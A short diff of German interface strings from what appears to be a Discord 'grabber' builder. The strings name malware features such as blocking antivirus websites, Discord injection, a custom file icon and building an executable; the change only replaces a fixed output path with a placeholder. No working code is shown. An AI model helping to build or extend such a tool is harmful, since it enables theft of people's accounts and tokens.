@@ -253,7 +253,7 @@ Blockiere AV-Websites (J/N)
 Discord-Injection (J/N)
 Dateisymbol
 Erstelle {name}.exe, das wird ein paar Sekunden dauern. Danke für Ihre Geduld!
-Datei befindet sich in 'output/grabberbuilder/{name}.exe
+Datei befindet sich in {path}
 Gruppenchat erstellt
 Rate begrenzt ({response.json()['retry_after']}ms)
 Nicht genügend Freunde für die zufällige Auswahl verfügbar
